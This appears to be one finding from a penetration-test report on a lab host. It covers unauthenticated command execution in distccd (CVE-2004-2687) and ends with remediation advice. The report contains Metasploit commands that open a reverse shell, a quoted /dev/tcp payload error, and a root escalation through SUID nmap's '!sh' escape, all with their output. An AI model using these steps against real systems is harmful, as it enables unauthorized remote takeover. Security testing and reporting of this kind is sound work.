# F-02 — DistCC Daemon Remote Command Execution → Privilege Escalation to Root

## Severity
Critical

## CVSS
- **NVD-published score:** CVSS v2.0 9.3 HIGH — `AV:N/AC:M/Au:N/C:C/I:C/A:C` (NVD has not published a CVSS v3.x score for this CVE)
- **Self-assessed CVSS v3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
  *(Self-assessed, not an NVD-published figure — provided because CVSS v3.1 is the standard used elsewhere in this report. Reflects unauthenticated, network-exploitable remote code execution with high confidentiality/integrity/availability impact once the subsequent privilege escalation, documented below, is accounted for.)*

## CVE
CVE-2004-2687

## Affected Service
distccd v1 (GNU 4.2.4) — port 3632/tcp

## CWE
CWE-306 — Missing Authentication for Critical Function

## Description
distccd, a distributed compilation daemon, executes compilation jobs sent to it without any authentication or access control. An attacker can submit a crafted "compile" job that instead executes an arbitrary command on the target. Metasploit's `exploit/unix/misc/distcc_exec` module automates this. The resulting shell runs as the low-privilege `daemon` user, not root — this finding documents both the initial foothold and the subsequent escalation to full root access.

## Validation — Part 1: Initial Access as `daemon`
```
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.56.102
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.56.101
msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD cmd/unix/reverse_perl
msf6 exploit(unix/misc/distcc_exec) > exploit
```

**Result:**
```
[*] Started reverse TCP handler on 192.168.56.101:4444
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:51534)

whoami
daemon
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> Note: the default payload (`cmd/unix/reverse_bash`, which relies on bash's `/dev/tcp` feature) failed against this target (`bash: /dev/tcp/...: No such file or directory`). Switching to `cmd/unix/reverse_perl` succeeded, since Perl is reliably present on the target and does not depend on that bash feature.

## Validation — Part 2: Privilege Escalation to Root
A search for SUID binaries on the target revealed `/usr/bin/nmap` with the SUID bit set — meaning it executes with the file owner's (root's) privileges regardless of who runs it. Older Nmap versions include an interactive mode that can spawn a shell, and because the Nmap binary itself runs as root here, the spawned shell inherits root privileges.

```
find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/nmap
...

nmap --interactive
Starting Nmap V. 4.53
nmap> !sh

whoami
root
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
```

Practical proof of root-level filesystem access (not just an effective-UID claim):
```
touch /root/pentest-root-proof
ls -l /root/pentest-root-proof
-rw-r--r-- 1 root daemon 0 Oct  2 20:43 /root/pentest-root-proof
rm /root/pentest-root-proof
```

## Attack Chain
```
DistCC Daemon Command Execution (unauthenticated)
   → Shell as low-privilege user 'daemon'
      → Discovery of SUID nmap binary
         → Interactive mode shell escape (!sh)
            → Effective root access (euid=0)
```

## Impact
An unauthenticated, remote attacker can execute arbitrary commands on the target with no credentials. While the initial foothold is limited to the `daemon` user, a misconfigured SUID binary on this host allows immediate escalation to full root access, resulting in complete system compromise.

## Evidence
- evidence/distccd-exploit-setup.png
- evidence/distccd-daemon-shell.png
- evidence/nmap-suid-privilege-escalation.png

## Remediation
- Disable or firewall the distcc service from any untrusted network; it was never designed to be authenticated and should not be exposed beyond a trusted build network
- Remove the SUID bit from `/usr/bin/nmap` (`chmod u-s /usr/bin/nmap`) — Nmap has no legitimate need to run with elevated privileges for standard scanning
- Routinely audit the system for unexpected SUID/SGID binaries (`find / -perm -4000` or `-2000`) as part of regular hardening
- Apply the principle of least privilege to all installed packages and binaries
